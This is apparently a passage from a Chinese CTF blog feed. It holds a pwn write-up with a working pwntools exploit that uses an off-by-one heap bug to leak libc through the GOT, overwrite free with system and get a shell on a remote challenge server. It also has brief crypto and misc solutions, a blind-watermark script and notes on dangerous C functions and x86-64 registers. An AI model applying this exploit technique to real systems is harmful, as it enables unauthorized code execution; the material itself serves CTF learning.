<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">0x603000</span>: <span class="number">0</span>x<span class="number">0000000000000000</span> <span class="number">0</span>x<span class="number">0000000000000021</span></span><br><span class="line"><span class="attribute">0x603010</span>: <span class="number">0</span>x<span class="number">0000000000000010</span> <span class="number">0</span>x<span class="number">0000000000603030</span> (chunk<span class="number">0</span>的大小和指针）</span><br><span class="line"><span class="attribute">0x603020</span>: <span class="number">0</span>x<span class="number">0000000000000000</span> <span class="number">0</span>x<span class="number">0000000000000021</span> (chunk<span class="number">0</span>)</span><br><span class="line"><span class="attribute">0x603030</span>: <span class="number">0</span>x<span class="number">0000000</span>a<span class="number">61616161</span> <span class="number">0</span>x<span class="number">0000000000000000</span> (“aaaa”)</span><br><span class="line"><span class="attribute">0x603040</span>: <span class="number">0</span>x<span class="number">0000000000000000</span> <span class="number">0</span>x<span class="number">0000000000000021</span></span><br><span class="line"><span class="attribute">0x603050</span>: <span class="number">0</span>x<span class="number">0000000000000010</span> <span class="number">0</span>x<span class="number">0000000000603070</span> (chunk<span class="number">1</span>的大小和指针）</span><br><span class="line"><span class="attribute">0x603060</span>: <span class="number">0</span>x<span class="number">0000000000000000</span> <span class="number">0</span>x<span class="number">0000000000000021</span> (chunk<span class="number">1</span>)</span><br><span class="line"><span class="attribute">0x603070</span>: <span class="number">0</span>x<span class="number">0000000</span>a<span class="number">62626262</span> <span class="number">0</span>x<span class="number">0000000000000000</span> (“bbbb”)</span><br><span class="line"><span class="attribute">0x603080</span>: <span class="number">0</span>x<span class="number">0000000000000000</span> <span class="number">0</span>x<span class="number">0000000000020</span>f<span class="number">81</span> (top chunk)</span><br><span class="line"><span class="attribute">0x603090</span>: <span class="number">0</span>x<span class="number">0000000000000000</span> <span class="number">0</span>x<span class="number">0000000000000000</span></span><br><span class="line"><span class="attribute">0x6030a0</span>: <span class="number">0</span>x<span class="number">0000000000000000</span> <span class="number">0</span>x<span class="number">0000000000000000</span></span><br></pre></td></tr></table></figure>

<p>然后是edit_heap函数</p>
<p><img src="/img/image-20210825215827003.png" alt="image-20210825215827003"></p>
<p>在这里发现了off-by-one漏洞</p>
<p>show_heap函数：</p>
<p><img src="/img/image-20210825215943902.png" alt="image-20210825215943902"></p>
<p>最后的delete_heap函数读出最后会把之前申请到的两个chunk都free掉</p>
<p><img src="/img/image-20210825220059801.png" alt="image-20210825220059801"></p>
<h4 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h4><p><strong>1.利用 off by one 漏洞覆盖下一个 chunk 的 size 字段，从而构造伪造的 chunk 大小。<br> 2.申请伪造的 chunk 大小，从而产生 chunk overlap，进而修改关键指针。</strong></p>
<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;175.24.233.124&#x27;</span>,<span class="number">10002</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">length,value</span>):</span></span><br><span class="line">	r.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">	r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Size of Heap : &quot;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(<span class="built_in">int</span>(length)))</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Content of heap:&quot;</span>)</span><br><span class="line">	r.sendline(value)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,value</span>):</span></span><br><span class="line">	r.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">	r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(<span class="built_in">int</span>(index)))</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Content of heap : &quot;</span>)</span><br><span class="line">	r.sendline(value)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">	r.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">	r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(<span class="built_in">int</span>(index)))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(<span class="built_in">int</span>(index)))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x81&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">size = <span class="string">b&#x27;\x08&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;d&#x27;</span>*<span class="number">0x40</span>+ size + p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">create(<span class="number">0x70</span>,payload)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Content : &#x27;</span>)</span><br><span class="line">free_addr = u64(r.recvuntil(<span class="string">&#x27;Done&#x27;</span>)[:-<span class="number">5</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;free&quot;</span>,free_addr)</span><br><span class="line">system_addr=free_addr+libc.dump(<span class="string">&quot;system&quot;</span>)-libc.dump(<span class="string">&quot;free&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto:"></a>Crypto:</h2><h3 id="tik-tak"><a href="#tik-tak" class="headerlink" title="tik-tak"></a>tik-tak</h3><p>根据提示键盘码，坐标轴那种，于是验证猜想，看到文档名称是tiktiktaktak，于是所有都回移一层，比如66该是第六行第二列，因为是两个6，但题目本身重叠，所以就该是第六行第一列，以此类推得出结果</p>
<h2 id="MISC："><a href="#MISC：" class="headerlink" title="MISC："></a>MISC：</h2><h3 id="缩小查看更多"><a href="#缩小查看更多" class="headerlink" title="缩小查看更多"></a>缩小查看更多</h3><p>这个题，我的方法比较硬来，直接stegsolve打开，看照片层，隐约明显能看清</p>
<p><img src="/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20210825221547.png"></p>
<p><img src="/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20210825221552.png"></p>
<h3 id="仅仅是流量分析？"><a href="#仅仅是流量分析？" class="headerlink" title="仅仅是流量分析？"></a>仅仅是流量分析？</h3><p>根据hint</p>
<p><img src="/img/image-20210825221847222.png" alt="image-20210825221847222"></p>
<p>ftm文件，rar损坏</p>
<p>ftm文件解压点开后还有个key.pcap文件</p>
<p>wireshark打开发现数据包，脚本得到数据包内容</p>
<p>然后010打开rar文件，发现文件块位置错误，修改后正常解压</p>
<p>打开发现233.png</p>
<p>stegsolve打开233.png，逐层找，找到一个二维码，扫码后拿到flag原样，结合xinan发现是维吉尼亚密码，再解密后又是栅栏密码，最后拿到flag</p>
<p><img src="/img/image-20210825222821574.png" alt="image-20210825222821574"></p>
<h3 id="可爱猫猫"><a href="#可爱猫猫" class="headerlink" title="可爱猫猫"></a>可爱猫猫</h3><p>两张表面上一样的图片</p>
<p>盲水印的问题，用github上的脚本</p>
<p><a href="https://github.com/chishaxie/BlindWaterMark">https://github.com/chishaxie/BlindWaterMark</a></p>
<p>跑出结果</p>
<p><img src="/img/flag.png"></p>
<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">cmd = <span class="literal">None</span></span><br><span class="line">debug = <span class="literal">False</span></span><br><span class="line">seed = <span class="number">20160930</span></span><br><span class="line">oldseed = <span class="literal">False</span></span><br><span class="line">alpha = <span class="number">3.0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;-h&#x27;</span> <span class="keyword">in</span> sys.argv <span class="keyword">or</span> <span class="string">&#x27;--help&#x27;</span> <span class="keyword">in</span> sys.argv <span class="keyword">or</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;Usage: python bwm.py &lt;cmd&gt; [arg...] [opts...]&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;  cmds:&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;    encode &lt;image&gt; &lt;watermark&gt; &lt;image(encoded)&gt;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;           image + watermark -&gt; image(encoded)&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;    decode &lt;image&gt; &lt;image(encoded)&gt; &lt;watermark&gt;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;           image + image(encoded) -&gt; watermark&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;  opts:&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;    --debug,          Show debug&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;    --seed &lt;int&gt;,     Manual setting random seed (default is 20160930)&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;    --oldseed         Use python2 random algorithm.&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;    --alpha &lt;float&gt;,  Manual setting alpha (default is 3.0)&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    cmd = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> cmd != <span class="string">&#x27;encode&#x27;</span> <span class="keyword">and</span> cmd != <span class="string">&#x27;decode&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;Wrong cmd %s&#x27;</span> % cmd)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;--debug&#x27;</span> <span class="keyword">in</span> sys.argv:</span><br><span class="line">        debug = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">del</span> sys.argv[sys.argv.index(<span class="string">&#x27;--debug&#x27;</span>)]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;--seed&#x27;</span> <span class="keyword">in</span> sys.argv:</span><br><span class="line">        p = sys.argv.index(<span class="string">&#x27;--seed&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt;= p+<span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;Missing &lt;int&gt; for --seed&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        seed = <span class="built_in">int</span>(sys.argv[p+<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">del</span> sys.argv[p+<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">del</span> sys.argv[p]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;--oldseed&#x27;</span> <span class="keyword">in</span> sys.argv:</span><br><span class="line">        oldseed = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">del</span> sys.argv[sys.argv.index(<span class="string">&#x27;--oldseed&#x27;</span>)]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;--alpha&#x27;</span> <span class="keyword">in</span> sys.argv:</span><br><span class="line">        p = sys.argv.index(<span class="string">&#x27;--alpha&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt;= p+<span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;Missing &lt;float&gt; for --alpha&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        alpha = <span class="built_in">float</span>(sys.argv[p+<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">del</span> sys.argv[p+<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">del</span> sys.argv[p]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;Missing arg...&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    fn1 = sys.argv[<span class="number">2</span>]</span><br><span class="line">    fn2 = sys.argv[<span class="number">3</span>]</span><br><span class="line">    fn3 = sys.argv[<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># OpenCV是以(BGR)的顺序存储图像数据的</span></span><br><span class="line"><span class="comment"># 而Matplotlib是以(RGB)的顺序显示图像的</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bgr_to_rgb</span>(<span class="params">img</span>):</span></span><br><span class="line">    b, g, r = cv2.split(img)</span><br><span class="line">    <span class="keyword">return</span> cv2.merge([r, g, b])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> cmd == <span class="string">&#x27;encode&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;image&lt;%s&gt; + watermark&lt;%s&gt; -&gt; image(encoded)&lt;%s&gt;&#x27;</span> % (fn1, fn2, fn3))</span><br><span class="line">    img = cv2.imread(fn1)</span><br><span class="line">    wm = cv2.imread(fn2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        plt.subplot(<span class="number">231</span>), plt.imshow(bgr_to_rgb(img)), plt.title(<span class="string">&#x27;image&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line">        plt.subplot(<span class="number">234</span>), plt.imshow(bgr_to_rgb(wm)), plt.title(<span class="string">&#x27;watermark&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print img.shape # 高, 宽, 通道</span></span><br><span class="line">    h, w = img.shape[<span class="number">0</span>], img.shape[<span class="number">1</span>]</span><br><span class="line">    hwm = np.zeros((<span class="built_in">int</span>(h * <span class="number">0.5</span>), w, img.shape[<span class="number">2</span>]))</span><br><span class="line">    <span class="keyword">assert</span> hwm.shape[<span class="number">0</span>] &gt; wm.shape[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">assert</span> hwm.shape[<span class="number">1</span>] &gt; wm.shape[<span class="number">1</span>]</span><br><span class="line">    hwm2 = np.copy(hwm)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(wm.shape[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(wm.shape[<span class="number">1</span>]):</span><br><span class="line">            hwm2[i][j] = wm[i][j]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> oldseed: random.seed(seed,version=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>: random.seed(seed)</span><br><span class="line">    m, n = <span class="built_in">list</span>(<span class="built_in">range</span>(hwm.shape[<span class="number">0</span>])), <span class="built_in">list</span>(<span class="built_in">range</span>(hwm.shape[<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">if</span> oldseed:</span><br><span class="line">        random.shuffle(m,random=random.random)</span><br><span class="line">        random.shuffle(n,random=random.random)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        random.shuffle(m)</span><br><span class="line">        random.shuffle(n)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(hwm.shape[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(hwm.shape[<span class="number">1</span>]):</span><br><span class="line">            hwm[i][j] = hwm2[m[i]][n[j]]</span><br><span class="line"></span><br><span class="line">    rwm = np.zeros(img.shape)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(hwm.shape[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(hwm.shape[<span class="number">1</span>]):</span><br><span class="line">            rwm[i][j] = hwm[i][j]</span><br><span class="line">            rwm[rwm.shape[<span class="number">0</span>] - i - <span class="number">1</span>][rwm.shape[<span class="number">1</span>] - j - <span class="number">1</span>] = hwm[i][j]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        plt.subplot(<span class="number">235</span>), plt.imshow(bgr_to_rgb(rwm)), \</span><br><span class="line">            plt.title(<span class="string">&#x27;encrypted(watermark)&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line"></span><br><span class="line">    f1 = np.fft.fft2(img)</span><br><span class="line">    f2 = f1 + alpha * rwm</span><br><span class="line">    _img = np.fft.ifft2(f2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        plt.subplot(<span class="number">232</span>), plt.imshow(bgr_to_rgb(np.real(f1))), \</span><br><span class="line">            plt.title(<span class="string">&#x27;fft(image)&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line"></span><br><span class="line">    img_wm = np.real(_img)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> cv2.imwrite(fn3, img_wm, [<span class="built_in">int</span>(cv2.IMWRITE_JPEG_QUALITY), <span class="number">100</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 这里计算下保存前后的(溢出)误差</span></span><br><span class="line">    img_wm2 = cv2.imread(fn3)</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(img_wm.shape[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(img_wm.shape[<span class="number">1</span>]):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(img_wm.shape[<span class="number">2</span>]):</span><br><span class="line">                <span class="built_in">sum</span> += np.power(img_wm[i][j][k] - img_wm2[i][j][k], <span class="number">2</span>)</span><br><span class="line">    miss = np.sqrt(<span class="built_in">sum</span>) / (img_wm.shape[<span class="number">0</span>] * img_wm.shape[<span class="number">1</span>] * img_wm.shape[<span class="number">2</span>]) * <span class="number">100</span></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;Miss %s%% in save&#x27;</span> % miss)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        plt.subplot(<span class="number">233</span>), plt.imshow(bgr_to_rgb(np.uint8(img_wm))), \</span><br><span class="line">            plt.title(<span class="string">&#x27;image(encoded)&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line"></span><br><span class="line">    f2 = np.fft.fft2(img_wm)</span><br><span class="line">    rwm = (f2 - f1) / alpha</span><br><span class="line">    rwm = np.real(rwm)</span><br><span class="line"></span><br><span class="line">    wm = np.zeros(rwm.shape)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(rwm.shape[<span class="number">0</span>] * <span class="number">0.5</span>)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(rwm.shape[<span class="number">1</span>]):</span><br><span class="line">            wm[m[i]][n[j]] = np.uint8(rwm[i][j])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(rwm.shape[<span class="number">0</span>] * <span class="number">0.5</span>)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(rwm.shape[<span class="number">1</span>]):</span><br><span class="line">            wm[rwm.shape[<span class="number">0</span>] - i - <span class="number">1</span>][rwm.shape[<span class="number">1</span>] - j - <span class="number">1</span>] = wm[i][j]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="keyword">assert</span> cv2.imwrite(<span class="string">&#x27;_bwm.debug.wm.jpg&#x27;</span>, wm)</span><br><span class="line">        plt.subplot(<span class="number">236</span>), plt.imshow(bgr_to_rgb(wm)), plt.title(<span class="string">u&#x27;watermark&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        plt.show()</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> cmd == <span class="string">&#x27;decode&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;image&lt;%s&gt; + image(encoded)&lt;%s&gt; -&gt; watermark&lt;%s&gt;&#x27;</span> % (fn1, fn2, fn3))</span><br><span class="line">    img = cv2.imread(fn1)</span><br><span class="line">    img_wm = cv2.imread(fn2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        plt.subplot(<span class="number">231</span>), plt.imshow(bgr_to_rgb(img)), plt.title(<span class="string">&#x27;image&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line">        plt.subplot(<span class="number">234</span>), plt.imshow(bgr_to_rgb(img_wm)), plt.title(<span class="string">&#x27;image(encoded)&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> oldseed: random.seed(seed,version=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>: random.seed(seed)</span><br><span class="line">    m, n = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="built_in">int</span>(img.shape[<span class="number">0</span>] * <span class="number">0.5</span>))), <span class="built_in">list</span>(<span class="built_in">range</span>(img.shape[<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">if</span> oldseed:</span><br><span class="line">        random.shuffle(m,random=random.random)</span><br><span class="line">        random.shuffle(n,random=random.random)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        random.shuffle(m)</span><br><span class="line">        random.shuffle(n)</span><br><span class="line"></span><br><span class="line">    f1 = np.fft.fft2(img)</span><br><span class="line">    f2 = np.fft.fft2(img_wm)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        plt.subplot(<span class="number">232</span>), plt.imshow(bgr_to_rgb(np.real(f1))), \</span><br><span class="line">            plt.title(<span class="string">&#x27;fft(image)&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line">        plt.subplot(<span class="number">235</span>), plt.imshow(bgr_to_rgb(np.real(f1))), \</span><br><span class="line">            plt.title(<span class="string">&#x27;fft(image(encoded))&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line"></span><br><span class="line">    rwm = (f2 - f1) / alpha</span><br><span class="line">    rwm = np.real(rwm)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        plt.subplot(<span class="number">233</span>), plt.imshow(bgr_to_rgb(rwm)), \</span><br><span class="line">            plt.title(<span class="string">&#x27;encrypted(watermark)&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line"></span><br><span class="line">    wm = np.zeros(rwm.shape)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(rwm.shape[<span class="number">0</span>] * <span class="number">0.5</span>)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(rwm.shape[<span class="number">1</span>]):</span><br><span class="line">            wm[m[i]][n[j]] = np.uint8(rwm[i][j])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(rwm.shape[<span class="number">0</span>] * <span class="number">0.5</span>)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(rwm.shape[<span class="number">1</span>]):</span><br><span class="line">            wm[rwm.shape[<span class="number">0</span>] - i - <span class="number">1</span>][rwm.shape[<span class="number">1</span>] - j - <span class="number">1</span>] = wm[i][j]</span><br><span class="line">    <span class="keyword">assert</span> cv2.imwrite(fn3, wm)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        plt.subplot(<span class="number">236</span>), plt.imshow(bgr_to_rgb(wm)), plt.title(<span class="string">u&#x27;watermark&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        plt.show()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>复现</tag>
      </tags>
  </entry>
  <entry>
    <title>一些危险函数和64位寄存器与32位不同之处</title>
    <url>/2021/06/26/%E4%B8%80%E4%BA%9B%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E5%92%8C64%E4%BD%8D%E5%AF%84%E5%AD%98%E5%99%A8%E4%B8%8E32%E4%BD%8D%E4%B8%8D%E5%90%8C%E4%B9%8B%E5%A4%84/</url>
    <content><![CDATA[<span id="more"></span>
<p>列举一下常见的危险函数：</p>
<h4 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h4><pre><code>    gets，直接读取一行，忽略&#39;\x00&#39;
    scanf
    vscanf
</code></pre>
<h4 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h4><pre><code>    sprintf
</code></pre>
<h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><pre><code>    strcpy，字符串复制，遇到&#39;\x00&#39;停止
    strcat，字符串拼接，遇到&#39;\x00&#39;停止
    copy
</code></pre>
<h3 id="64位与32位寄存器区别有："><a href="#64位与32位寄存器区别有：" class="headerlink" title="64位与32位寄存器区别有："></a>64位与32位寄存器区别有：</h3><p>64位有16个寄存器，32位只有8个。但是32位前8个都有不同的命名，分别是e _ ，而64位前8个使用了r代替e，也就是r_。<br>e开头的寄存器命名依然可以直接运用于相应寄存器的低32位。而剩下的寄存器名则是从r8 - r15，其低位分别用d，w,b指定长度。</p>
<p>32位使用栈帧来作为传递的参数的保存位置，而64位使用寄存器，分别用rdi,rsi,rdx,rcx,r8,r9作为第1-6个参数。rax作为返回值。</p>
<p>64位没有栈帧的指针，32位用ebp作为栈帧指针，64位取消了这个设定，rbp作为通用寄存器使用。</p>
<p>64位支持一些形式的以PC相关的寻址，而32位只有在jmp的时候才会用到这种寻址方式。</p>
<p><img src="/img/64.png"></p>
<h3 id="过程（函数）调用的不同"><a href="#过程（函数）调用的不同" class="headerlink" title="过程（函数）调用的不同"></a>过程（函数）调用的不同</h3><pre><code>参数通过寄存器传递（见前文）
callq 在栈里存放一个8位的返回地址
许多函数不再有栈帧，只有无法将所有本地变量放在寄存器里的才会在栈上分配空间。
函数可以获取到栈至多128字节的空间。这样函数就可以在不更改栈指针的情况下在栈上存储信息（也就是说，可以提前用rsp以下的128字节空间，这段空间被称为red zone，在x86-64里，时刻可用）
不再有栈帧指针。现在栈的位置和栈指针相关。大多数函数在调用的一开始就分配全部所需栈空间，之后保持栈指针不改变。

一些寄存器被设计成为被调用者-存储的寄存器。这些必须在需要改变他们值的时候存储他们并且之后恢复他们。
</code></pre>
